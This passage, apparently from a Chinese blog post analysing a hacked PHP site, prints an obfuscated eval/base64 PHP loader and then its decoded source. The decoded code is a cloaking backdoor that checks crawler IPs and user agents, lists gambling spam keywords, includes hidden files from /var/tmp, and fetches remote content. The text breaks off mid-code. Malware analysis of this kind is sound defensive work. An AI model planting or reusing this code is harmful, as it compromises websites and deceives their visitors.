#ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">18<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">3<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O0OO00<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">0<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O0OO00<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">1<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">24<\/span><span style=\"text-decoration: underline;\">};$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">OO0000<\/span><span style=\"text-decoration: underline;\">=$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">7<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">13<\/span><span style=\"text-decoration: underline;\">};$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00O0O<\/span><span style=\"text-decoration: underline;\">.=$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">22<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">36<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">29<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">26<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">30<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">32<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">35<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">26<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">30<\/span><span style=\"text-decoration: underline;\">};<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">eval(<\/span><span style=\"text-decoration: underline;\">$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00O0O<\/span><span style=\"text-decoration: underline;\">(<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"JE8wTzAwMD0idVJKalF2d2xZRHBIS29Vc2tBZG1pQlphTkdxeEZoQ1hUZ09MY1Z0RVd5Yk1Jcm56UGVTZklUak95VnFVZmdDZWx1SndkQldzUXpTbnRLeExrUEVtRnBYTWJhaFJ2SGlBR1lyY05vWkROZzlxbmVCdEVROHhneXV4Zm1hMG5LOUhYcld1aTJraG55MGxsUUJwSmFScEdndTBYZ2RIQWdKM2d5dXhNcTBsU21qSGkzakRic2FxaTNqMG52NXJsZ0JDWHEwbGpLU0NpS2FSbm1HcE5aQnJNM1NQYlE5MGltQlZNVXRTSjBUYUZhQlZqY3d0RVFUakpnMGRtMXRrSlVTa0pVd3JKZGF0RjFUa20wa1JUa0dybUZ3dEVRVEVpM3k5ams5RlRhanZUYWppajBQSmFrekRhYXRrSlU5elQwYVhhRVdXWHEwbGpralVTTzBkbTF0a0pVU2tKVXdyWmtUSkprOVpUSlNrSmRhWmoxMDdneXVkWjBVeU52a0hic2s1bEViTEFGYklBT3BJQU9KMU1PQTNqSHFyQUZSMk1PSjFNT0cwQVo0SHRFYndqY1JIdFo0MnRFNDV0RTRIQUZkck1FYkxBRmRJQUZ5M01PUkx0RTRIQUZBck1FYkxBRnBJQUZHSE1PUjRYRTRMWEZ5ck1FYjJBRTRMdGNHSUFPRzVNT2ZMakhxcnRPUklBRnA0TU9BNU1PUjJqSHFydE9SSUFGeTNNT2Q0TU9SNVhFYndqY2ZMTU9SSFhaNDB0WjQzQVFid2pjUkxBSDQ1WEU0SHRGeUlBT3kxakhxcnRGcElBT0dMTU9mTE1PUkhYRWJ3amNSTHRINGN0RTQzQUg0M0FFYndqY0o0TU9HTHRaNExYRkJJWGd5ck1FYkxBRmJJQU9wSUFPSjFNT0pjakhxckFGcGNNT2RMTU95cU1PUjB0RWJ3amNSTHRINEhBWjRIQU9CSUFPeTFqSHFyQUZHSE1PR0hYRTRIQWdCSXRnZnJNRWIyQVo0THRPeUlBRkpxTU9icWpIcXJ0T1JJQUZ5M01PUnFYRTQwQVpid2pjUkx0UTQxdFo0SHRnR0lBRkE0akhxckFGUjBNT3BxTU9HSEFRNEh0Z0dyTUViMkFaNEx0Z2JJQUZCNE1PeUxqSHFyQUZSMk1PRzF0WjRIQWNCSXRjQnJNRWJIQU9HSUFGcDJNT0cwTU9HMmpIcXJBT0dITU9SNHRRNEh0RTQxWFpid2pjR0hBRTRMWGdSSUFGSjRNT1JxdFFid2pjUkhBSDRMQU9KSUFGZnFNT0dMdFpiQ1hxMGxqUmhFaTN5OWZtakhmbWR1ajBqUG52VDFiM3pDU0thSGpIcXJUMjlWUzJMVWZzOTBqSHFydnZrdWkyOHJNRVdFbnY1cmZzOTBqSHFySjI5Y2kzdHFudlRVYlFid2oxdFZTMjkxakhxckFjZnFKM3pDU0thSGpIcXJ2djkxU0trVnlzOTBqSGQ3Z3l1ZFoyYTVOdmtIYnNrNWxFV1BpcmsxZnY0SWkzanJqSHFyUzI5VlMyTFVNc3RWaVpid2ozdFZiMjhJZjI5aGpIcXJqdko0anZHMWpGUE9qSHFyanZKNWp2a1Bqdkdxakhxcmp2SjVqdkdManZqT2pIcXJqdkozakZwNWpGVVFqSHFyanZKMWpGUGRqRlVQanZKMWp2amRqdlI1akhxcmp2SjNqRmQ1anZqVWp2SjFqdmtVanZHMmpIcXJqdkoyanZSY2pGUFFqdkozakZwNWpGUE9qSHFyanZKMmp2RzRqdkc0anZKMmpGcDRqRlBzakhxcmp2SjFqdlI0anZHTGp2SjBqdkc1akZkcWpIcXJqdkoxakZVUWp2amRqdko1akZkNWpGcDFqSHFyanZKM2pGVU9qRlVzanZKMGp2alBqdmpQakhxcmp2SjNqRlVPakZVc2p2SjVqRmRIanZHTGpIcXJqdkozakZQVWp2R3Fqdko1akZwM2pGZExqSHFyanZKMmp2R2NqdlI0anZKMWpGcDJqRlBPakhxcmp2SjFqdmpPakZwcWp2SjJqRnA0anZHM2pIcXJqdkoxanZqZGp2UjVqdko1akZwM2pGZExqSHFyanZKNGp2RzFqRlVQanZKNWpGZEhqdkdMakhxcmp2SjJqRlBzakZkcWp2SjNqRlBVanZHcWpIcXJqdkozanZrZGpGZDJqdkozakZkMWp2UjFqSHFyanZKNGp2a3NqRmQxanZKM2pGUFVqdlI1akhxcmp2SjFqdkc1anZHY2p2SjFqRlBzanZHcWpIcXJqdkoxanZSMGp2a1Bqdko1akZkNGp2R2NqdkoxakZVc2pGUFVqSHFyanZKMGp2amRqRmRjanZKNWp2a1BqRlBPanZKNWpGcDNqRmRMakhkN2d5Q3NXdjVPV0tVVmlRemRTdkFxU0tKdWpLU0NpS2FSbm1Hd2pLVFBXS1JDb3EwbGpLVFBXS2t6YnJHcE5aelVvZXp3aTJUVWxFYjZqSHFkU0trMGZaZDdneXVqalJoVW9tQXBOWnpVb2V6d2kyVFVsRWI2akhMUWZtdFV0T1REU0thT2kyVFVsZXQwYlU5SGkzeUxBSFBxZnZ0WWxFV0dsUWJ3aktUUFdLa3picmppQWswQ2xaZENYcTBsRVpUWFNtV2NHZzBwU21QcWlLOWRTWnByWFFid2Zza2NTRmYwbTJUVWYyOWRTWlBjV2VqRGJzOTBBRkF1YktrT25IcHJaRXVyTUVUZGZtVFB5bWpIdmNrV2xaZENsRnd0RXBkZEZLVUluM0E5R0thNGJLTFZTS0p1amN1ck1LalBiMkoydGs5ZFN2dFZTS0p1YjNUSG0zalZXZ1JjbGV6UGYyd3VqMHB4akhxZFNLazBmSmtIYlV3SG1aZENsWmQ3Z3l1anlLVUlmMkwxU0tKdWpLU0NpS2FSbm1HSWpINW1uZ3p6aUpkSUZKOVJUSnFybEZoZG52SjdneUM5Z3lDc1d2NU9XS1VWaVF6clNtVGRmbVRQbEVUZGZtVFBtM2FIaUVVN2d5Q0NTUUJ1U3JhSWYzVENpMjVEU21QQ2IzVGNsRVdPV21qd20yYTRTdkFybFpkcG9xMGxqZXRxbTJ0MWJzcXBOWnpCZjNhSGlrOUNpc1UwbEVkN2d5Q09XbWp3bTN0VVdLOXFXRXBkYjN6RGYzYUhpRXFweTFhWkZSOXlhazlhSmRxd0dFVGRmbVRQbTNhSGlFZDdneUNPV21qd20zdFVXSzlxV0VwZGIzekRmM2FIaUVxcHkxYVpGUjl5YWs5R1RKa1JUYUd3R2dCQ1hxMGxmM2FIaWs5Y1NtVFZiZXl1amV0cW0ydDFic3F3R1J0YUpkTE5Ka1REeTA5WEZkYWdha1RqRkphTmFheXdHZ0pDWHEwbGYzYUhpazljU21UVmJleXVqZXRxbTJ0MWJzcXdHUnRhSmRMTkprVERKZGFKYWFqWGFranpGVXRLVGFHd0dnUkNYcTBsakt0VmlyVFVpclRjR2cwcHlLdDFic0xEU21QVWZIcGRiM3pEZjNhSGlFZDdneUNCZjNhSGlrOU9pSzljU1pwZGIzekRmM2FIaUVkN2d5QzlTdkxjU3ZVc2xLUzFpc3QwbnY5SW0yYTRubXQwYkhwcmIzVEhTdmtobTJ0VmlyVFVvZVREZjNqVWZtVFVqSGRDR2V3dEVRVGNiazlPaTI1MEdnMHBmbWpIZm1kdWoyUDBXZUJyR2cwK0dLa0hic2s1bEVXaFNtVHVpMnlyR2cwK0dFV2VUYXlyTUVXMG52MVVpM2EwakhCOU5RQjFsWmQ3Z3l1ZGIzekRiM1RIU1pCOUdSemNXZWpVZnYxRGYyOUlXS2E0V2s5T2JzYVBXS0p1amV0cW0ydFZpcnlDWHEwbGpLdFZpclRVaXJUY0dnMHB5S1NDaUthRFMyYTBtMnRWaXJUVWlyVGNsRVRkZm1UUG0zYUhpRXFwU3Nrd2IySndHRVRjYms5Y1dlalVsRnd0RXIxVWlldFVvcTBsaktQUGlzVHdTWkI5R1J6c2kzelVpUXBkU0trMGZhOTFic3F3R0VqSGZRR0NYSEJ0RVFUT2kyNTBTdjUwYkhCOUdSemNXZWpVZnYxRFMyYTBtMnRWaXJUVWlyVGNsRVR1ZnY1ZGlLSkNYSEJ0RWR6c2YyTFZiMkp1aktQUGlzVHdTWmQ3Z3lDOWd5Q0hTbVQxYnM0cGpLdFZpclRVaXJUY1hxMGxEeTBsU3JhSWYzVENpMjRwYjJQVldIcGRTc1V3U0pUQ2JRVTdneXVkU3NVd1N2NVBpdko5aktTQ2lLYVJubUdJaXZ5MWxFVERKMGFaYWRhWnZIV0dha1R5bTBQTkoxeXJtWjRkbTF0a0pVU2tKVXdySmRhVGFKYUZhazlhSmRkcm1aZDdneUNDU1FQQ2IxOXNudkxVbEVUc252TFVpc2toU1pkQ29xMGxFWlRzYmcxQlNzOXFTdjR1aktTQ2lLYUlmdjFVTUVXSGpIZDdneXVqaktUUFdLUjl5S1NIU3ZrZGxFVHNiRUxzbnZMVWIyVTZTWnBkU3NVd1N2NVBpdkpDbEZ3dEVwVUJTc3R3aTN0VWxFVHNiRWQ3Z3l1am52ZnVTdjFxV2VkdWpLVFBXS1JDbFp6N3llYUlpS1VJbkhwZFNzVXdTdjVQaXZKQ1gzalVXZWFIaU9oOWd5dWpTS2FPQUtUVWxFVHNudkxVVEtVSE1FVGRmbVRQbEZ3dEVyMHBTdkxjU1p6N2d5dWpqS1RQV0tSOVMyYTBTS2swZlpwcm5lVDBiZ3VWTTJqVVdFNWRubXRPV211SWYyOWhNc1RVTTNicWIyUENGMjgzTXJ6dWJnOUdGMXRKTlpiSWprOUZUYWp2VGFqaWowUEpha3pEWlI5RmFFV1dsRnd0RXBkZFNyQjl5S1NWYkthSWxFVHNudkxVaXNraFNacXJXSGJDWHEwbEVKenNXM2pDV0tKdWpLU3FNRVRkZm1UUGxGd3RFcFVCU3N0d2kzdFVsRVRzYkVkN2d5dWpudmZ1YjNUSGlLYUlsRVRkZm1UUGxaQitHZ1JxQWdCQ0dld3RFcFVkU3ZBcVNLSnVqS1NDaUthUm5tR3dqS1RQV0tSQ1hxMGxFbTB0RXIxOWd5Q0NTUXBQbnY1RGZtakhmbWR1alJVeU1FVE1aYUJDbG13dEVzU1Zic2FQZjJwdWpSaEVpM3lwZm1BcGpSaEVpM1RjbG1oQ1NRUGNXZWpDYjNUSGxFVEVpM3l3alJoRWkzVGNsWlU3Z3lDY25LOTNsRVRzbnZMVVRLVUhsRnd0RXIxOVNzOUhTdmtPbkVwZFoyYTVHS2tjR0VUTVNtVWNsbXd0RXNVc2xldDBic1VjV2VHdWpralVTUXFkWjJhNWJIZENvcTBsU3Z0dWlIQlFOS1RDV1F6Y1dlVXdTRjByU0tVY2JLTFBvRkNJaTI1VWpjNDhiMnRIbm16MEdLTFBpc1cxZnZXVU5aV3hmbVNQYjJ0SG5tejBqSHpjYnNBOWoyUDBXZUI2TUg5T2kzYUlXZ0FMTU9KTG92YWNNc3RWaVo5T2lLVU9uSDVQYjN6NE4yVWRORkFMQWdkMEFnQTBBSFN3aTJXVk5GUnJHS3R1Zm1qY1NteTlqMldRQU9BTEFRYitORTljZjNqQ2JleStORTlkbm1mK05ldE9ic1VxV0V6MG9telVOWlcwU21QME0yQ1BXc2tjZjNqQ2JleXJHZXRIZmMwcm5lVDBiZ3VWTTJrcW5aNWRubXRPV211SWYyOWhNc1RVTTF0VWlINXhiSGIrTkU5Y2YzakNiZXkrR09oOURtMHRFcD09IjtldmFsKCc\/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw==\"<\/span><span style=\"text-decoration: underline;\">));<\/span><span style=\"color: #cc99cc; text-decoration: underline;\">?&gt;<\/span>\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u53c2\u8003 <a href=\"http:\/\/blog.i1728.com\/post\/99.html\">\u7f51\u4e0a\u65b9\u6cd5<\/a> \u89e3\u7801\u7684\u7ed3\u679c\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #cc99cc;\">&lt;?php<\/span>\n<span style=\"color: #999999; font-style: italic;\">\/*<\/span>\n<span style=\"color: #999999; font-style: italic;\">*author:whoami<\/span>\n<span style=\"color: #999999; font-style: italic;\">*  QQ  :4892057<\/span>\n<span style=\"color: #999999; font-style: italic;\">*\/<\/span>\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">error_reporting(0<\/span>);\n$<span style=\"color: #ffcc66;\">fileDir<\/span> = <span style=\"color: #66cccc;\">'\/var\/tmp\/.SYSDUMP\/'<\/span>;\n$<span style=\"color: #ffcc66;\">IP<\/span>=$<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'REMOTE_ADDR'<\/span>];\n$<span style=\"color: #ffcc66;\">Bot<\/span>=$<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'HTTP_USER_AGENT'<\/span>];\n$<span style=\"color: #ffcc66;\">Ref<\/span>=$<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'HTTP_REFERER'<\/span>];\n$<span style=\"color: #ffcc66;\">KIP<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'117.28.255.37'<\/span>,<span style=\"color: #66cccc;\">'116.55.241.24'<\/span>,<span style=\"color: #66cccc;\">'125.64.94.219'<\/span>,<span style=\"color: #66cccc;\">'119.147.114.213'<\/span>,<span style=\"color: #66cccc;\">'11<\/span><span style=\"color: #66cccc; text-decoration: underline;\">8.122.188.194'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'60.172.229.61'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'61.188.39.16'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'61.147.98.198'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'61.129.45.72'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'113.98.254.245'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'58.221.61.128'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'117.34.73.70'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'58.215.190.84'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'117.28.255.53'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'183.91.40.144'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'117.21.220.245'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'122.228.200.46'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'61.164.150.70'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'61.147.108.41'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'116.55.242.138'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'114.80.222.242'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'61.147.108.41'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'116.255.230.70'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'222.186.24.26'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'222.186.24.59'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'220.181.158.106'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'123.125.160.215'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n$<span style=\"color: #ffcc66;\">KBot<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'Baiduspider'<\/span>,<span style=\"color: #66cccc;\">'Googlebot'<\/span>,<span style=\"color: #66cccc;\">'Yahoo'<\/span>,<span style=\"color: #66cccc;\">'Bingbot'<\/span>,<span style=\"color: #66cccc;\">'Sosospider'<\/span>,<span style=\"color: #66cccc;\">'Sogou'<\/span>,<span style=\"color: #66cccc;\">'36<\/span><span style=\"color: #66cccc; text-decoration: underline;\">0Spider'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'YoudaoBot'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n$<span style=\"color: #ffcc66;\">Key<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'anquan.org'<\/span>,<span style=\"color: #66cccc;\">'google.com'<\/span>,<span style=\"color: #66cccc;\">'soso.com'<\/span>,<span style=\"color: #66cccc;\">'%e8%b5%8c'<\/span>,<span style=\"color: #66cccc;\">'%e9%aa%b0'<\/span>,<span style=\"color: #66cccc;\">'%e9%b1%<\/span><span style=\"color: #66cccc; text-decoration: underline;\">bc'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e7%89%9b'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e5%8d%9a%e5%bd%a9'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e7%99%be%e5%ae%b6'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e6%a3%8b%e7%89%8c'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e6%b8%b8%e6%88%8f'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e5%a8%b1%e4%b9%90'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e5%9b%bd%e9%99%85'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e7%9c%9f%e4%ba%ba'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e7%9c%9f%e9%92%b1'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e7%8e%b0%e9%87%91'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e6%b3%a8%e5%86%8c'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e5%bc%80%e6%88%b7'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e5%bd%a9%e9%87%91'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e8%b5%9a%e9%92%b1'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e6%8f%90%e7%8e%b0'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e7%ad%96%e7%95%a5'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e8%af%95%e7%8e%a9'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e5%b9%b3%e5%8f%b0'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e5%a4%aa%e9%98%b3%e5%9f%8e'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'%e4%bd%93%e9%aa%8c%e9%87%91'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">dec0de<\/span>($<span style=\"color: #ffcc66;\">fileDir<\/span>,$<span style=\"color: #ffcc66;\">data<\/span>){\n$<span style=\"color: #ffcc66;\">dataArr<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">explode(<\/span><span style=\"color: #66cccc;\">':'<\/span>,$<span style=\"color: #ffcc66;\">data<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">Keys<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">explode(<\/span><span style=\"color: #66cccc;\">':'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">base64_decode(str_rot13(pack(<\/span><span style=\"color: #66cccc;\">'H*'<\/span>,$<span style=\"color: #ffcc66;\">dataArr<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>]))));\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">News<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">explode(<\/span><span style=\"color: #66cccc;\">':'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">base64_decode(str_rot13(pack(<\/span><span style=\"color: #66cccc;\">'H*'<\/span>,$<span style=\"color: #ffcc66;\">dataArr<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>]))));\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">Links<\/span>= <span style=\"color: #cccccc; background-color: #2d2d2d;\">explode(<\/span><span style=\"color: #66cccc;\">':'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">base64_decode(str_rot13(pack(<\/span><span style=\"color: #66cccc;\">'H*'<\/span>,$<span style=\"color: #ffcc66;\">dataArr<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>]))));\n<span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #99cc99;\">include<\/span>($<span style=\"color: #ffcc66;\">fileDir<\/span>.<span style=\"color: #66cccc;\">'.Wh0AmI.MODEL'<\/span>);<span style=\"color: #f2777a; font-weight: bold;\">die<\/span>;\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">getdata<\/span>($<span style=\"color: #ffcc66;\">data_url<\/span>){\n<span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">function_exists(<\/span><span style=\"color: #66cccc;\">'curl_exec'<\/span>)) {\n$<span style=\"color: #ffcc66;\">sp_curl<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">curl_init(<\/span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">curl_setopt(<\/span>$<span style=\"color: #ffcc66;\">sp_curl<\/span>, <span style=\"color: #f2777a; font-weight: bold;\">CURLOPT_URL<\/span>, $<span style=\"color: #ffcc66;\">data_url<\/span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">curl_setopt(<\/span>$<span style=\"color: #ffcc66;\">sp_curl<\/span>, <span style=\"color: #f2777a; font-weight: bold;\">CURLOPT_HEADER<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">curl_setopt(<\/span>$<span style=\"color: #ffcc66;\">sp_curl<\/span>, <span style=\"color: #f2777a; font-weight: bold;\">CURLOPT_CONNECTTIMEOUT<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">5<\/span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">curl_setopt(<\/span>$<span style=\"color: #ffcc66;\">sp_curl<\/span>, <span style=\"color: #f2777a; font-weight: bold;\">CURLOPT_RETURNTRANSFER<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>);\n$<span style=\"color: #ffcc66;\">contents<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">curl_exec(<\/span>$<span style=\"color: #ffcc66;\">sp_curl<\/span>);\n@<span style=\"color: #cccccc; background-color: #2d2d2d;\">curl_close(<\/span>$<span style=\"color: #ffcc66;\">sp_curl<\/span>);\n}<span style=\"color: #99cc99;\">elseif<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">function_exists(<\/span><span style=\"color: #66cccc;\">'stream_context_create'<\/span>)) {\n$<span style=\"color: #ffcc66;\">sp_cont<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'http'<\/span> =<span style=\"color: #6699cc;\">&gt;<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'method'<\/span> =&gt; <span style=\"color: #66cccc;\">'GET'<\/span>,<span style=\"color: #66cccc;\">'timeout'<\/span> =&gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">5<\/span>));\n$<span style=\"color: #ffcc66;\">sp_stre<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">stream_context_create(<\/span>$<span style=\"color: 